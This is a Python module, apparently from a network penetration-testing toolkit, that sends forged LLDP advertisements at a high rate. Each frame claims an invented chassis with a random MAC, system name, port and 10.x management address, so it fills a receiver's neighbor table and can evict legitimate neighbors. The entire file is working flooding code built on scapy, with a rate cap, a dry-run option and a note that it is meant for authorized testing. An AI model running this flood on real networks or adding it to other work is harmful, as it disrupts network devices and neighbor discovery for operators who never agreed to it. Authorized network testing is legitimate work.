"""LLDP flooding: send a high rate of LLDP advertisements for invented devices.

A receiver that keeps LLDP neighbors stores one entry for each chassis that advertises.
A flood of advertisements from invented chassis, each with its own MAC, name, port and
address, fills that table and keeps the receiver busy parsing them. Legitimate neighbors
can be evicted or refused while the flood lasts.

Every frame here comes from a random unicast source MAC, claims a random chassis MAC and
advertises a random system name, port and management address, so each one can create a
new neighbor entry. The effect to measure is the neighbor table and the rate it keeps up with.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp

from macabre.attacks.common import random_mac
from macabre.attacks.lldp_spoofing import build_lldp_frame

MAX_RATE = 5000.0          # frames per second; higher rates are refused
BATCH_SECONDS = 0.1        # frames are sent in batches this long


@dataclass(frozen=True)
class LldpFloodingConfig:
    iface: str                  # attacker interface, on the segment with the receiver
    rate: float = 100.0         # advertisements per second
    count: int = 0              # advertisements to send in total; 0 = run until stopped
    dry_run: bool = False       # build advertisements but do not send them

    def __post_init__(self) -> None:
        if not 0 < self.rate <= MAX_RATE:
            raise ValueError(f"Rate must be between 0 and {MAX_RATE:g} advertisements per second.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")


@dataclass
class LldpFloodingStats:
    frames: int = 0
    status: str = ""


def flood_frames(rng: random.Random, how_many: int) -> list:
    """Advertisements from random source MACs, each for a random chassis, name, port and address."""
    frames = []
    for _ in range(how_many):
        address = str(ipaddress.IPv4Address(0x0A000000 | rng.getrandbits(24)))  # 10.0.0.0/8
        frames.append(build_lldp_frame(
            random_mac(rng),
            random_mac(rng),
            f"SW-{rng.getrandbits(32):08x}",
            f"Gi0/{rng.randrange(1, 49)}",
            address=address,
        ))
    return frames


def run_lldp_flooding(
    config: LldpFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[LldpFloodingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> LldpFloodingStats:
    """Send advertisements at `rate` per second until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = LldpFloodingStats(
            status=(
                f"Dry run: would send about {config.rate:g} LLDP advertisements per second for random "
                f"chassis. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    per_batch = max(1, round(config.rate * BATCH_SECONDS))
    stats = LldpFloodingStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        batch = per_batch
        if config.count:
            batch = min(batch, config.count - stats.frames)
        send(flood_frames(rng, batch), iface=config.iface, verbose=False)
        stats.frames += batch
        on_progress(replace(stats))
        stop_event.wait(BATCH_SECONDS)
    return stats
